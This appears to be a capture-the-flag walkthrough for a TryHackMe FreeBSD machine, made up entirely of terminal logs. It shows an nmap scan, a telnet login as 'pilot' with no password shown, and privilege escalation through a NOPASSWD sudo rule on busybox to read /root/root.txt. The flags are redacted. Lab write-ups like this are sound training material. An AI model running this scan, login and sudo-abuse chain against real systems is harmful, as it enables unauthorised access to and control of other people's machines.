# nmap
```
root@kali:~# nmap -sV -sC -T5 -p- 10.10.88.119
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-18 09:02 UTC
Warning: 10.10.88.119 giving up on port because retransmission cap hit (2).
Nmap scan report for ip-10-10-88-119.eu-west-1.compute.internal (10.10.88.119)
Host is up (0.0019s latency).
Not shown: 44133 filtered ports, 21400 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (FreeBSD 20170903; protocol 2.0)
| ssh-hostkey:
|   2048 5b:e6:85:66:d8:dd:04:f0:71:7a:81:3c:58:ad:0b:b9 (RSA)
|   256 d5:4e:18:45:ba:d4:75:2d:55:2f:fe:c9:1c:db:ce:cb (ECDSA)
|_  256 96:fc:cc:3e:69:00:79:85:14:2a:e4:5f:0d:35:08:d4 (ED25519)
23/tcp open  telnet  BSD-derived telnetd
MAC Address: 02:89:40:DB:D5:06 (Unknown)
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.42 seconds
root@kali:~#
```


# telnet
```
root@kali:~# telnet 10.10.88.119
Trying 10.10.88.119...
Connected to 10.10.88.119.
Escape character is '^]'.
login: pilot
Last login: Sat Oct  5 23:48:53 from cpc147224-roth10-2-0-cust456.17-1.cable.virginm.net
FreeBSD 11.2-STABLE (GENERIC) #0 r345837: Thu Apr  4 02:07:22 UTC 2019

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
To see how long it takes a command to run, type the word "time" before the
command name.
                -- Dru <genesis@istar.ca>
[pilot@freebsd ~]$ ls
user.txt
[pilot@freebsd ~]$ cat user.txt
THM{XXXXXXXXXXXXXXXXXX}
[pilot@freebsd ~]$
```


```
[pilot@freebsd ~]$ sudo -l
User pilot may run the following commands on freebsd:
    (root) NOPASSWD: /usr/local/bin/busybox
[pilot@freebsd ~]$
```

```
[pilot@freebsd ~]$ /usr/local/bin/busybox
BusyBox v1.30.1 (2019-08-23 13:25:19 UTC) multi-call binary.
BusyBox is copyrighted by many authors between 1998-2015.
Licensed under GPLv2. See source distribution for detailed
copyright notices.

Usage: busybox [function [arguments]...]
   or: busybox --list
   or: function [arguments]...

 BusyBox is a multi-call binary that combines many common Unix
 utilities into a single executable.  Most people will create a
 link to busybox for each function they wish to use and BusyBox
 will act like whatever it was invoked as.

Currently defined functions:
 addgroup, ar, arch, ash, awk, base64, basename, bc, bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown,
 chroot, cksum, clear, cmp, comm, cp, cpio, crond, crontab, cttyhack, cut, dc, dd, delgroup, diff, dirname,
 dnsd, dos2unix, dpkg, dpkg-deb, du, echo, ed, env, expand, expr, factor, fakeidentd, fallocate, false,
 fatattr, find, flock, fold, fsync, ftpd, ftpget, ftpput, getopt, grep, groups, gunzip, gzip, hd, head,
 hexdump, hexedit, hostid, hostname, httpd, id, inetd, install, iostat, ipcalc, kill, killall, killall5,
 klogd, less, link, ln, logger, logname, logread, lpq, lpr, ls, lzcat, lzma, lzop, makemime, man, md5sum,
 microcom, mkdir, mkfifo, mknod, mktemp, more, mpstat, mv, nc, nice, nl, nmeter, nohup, nologin, nslookup,
 ntpd, nuke, od, paste, patch, pgrep, pidof, ping, ping6, pipe_progress, pkill, pmap, popmaildir, poweroff,
 printenv, printf, ps, pscan, pwd, pwdx, readlink, readprofile, realpath, reboot, reformime, renice, reset,
 resize, resume, rev, rm, rmdir, rpm, rpm2cpio, run-parts, scriptreplay, sed, sendmail, seq, setsid, sh,
 sha1sum, sha256sum, sha3sum, sha512sum, shred, shuf, sleep, smemcap, sort, split, ssl_client, stat, strings,
 stty, su, sulogin, sum, svok, sync, syslogd, tail, tar, tee, telnet, telnetd, test, tftp, tftpd, timeout,
 top, touch, tr, traceroute, traceroute6, true, truncate, tty, ttysize, uname, uncompress, unexpand, uniq,
 unix2dos, unlink, unlzma, unxz, unzip, usleep, uudecode, uuencode, vi, volname, watch, wc, wget, which,
 whoami, xargs, xxd, xz, xzcat, yes, zcat
[pilot@freebsd ~]$ sudo /usr/local/bin/busybox ls /root
root.txt
[pilot@freebsd ~]$ sudo /usr/local/bin/busybox cat /root/root.txt
THM{XXXXXXXXXXXXXXXXXXXXXXXX}
```
